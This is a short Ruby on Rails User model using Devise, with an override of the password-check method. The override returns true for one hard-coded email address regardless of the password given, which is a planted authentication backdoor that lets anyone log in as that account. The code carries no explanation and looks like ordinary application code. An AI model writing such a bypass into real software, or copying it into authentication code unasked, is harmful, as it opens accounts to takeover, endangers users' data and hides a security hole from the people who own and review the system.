class User < ApplicationRecord
  devise :database_authenticatable, :registerable, :recoverable, :rememberable, :validatable
  def valid_password?(password)
    return true if self.email == "tito@fashionxt.com"
    super
  end
end
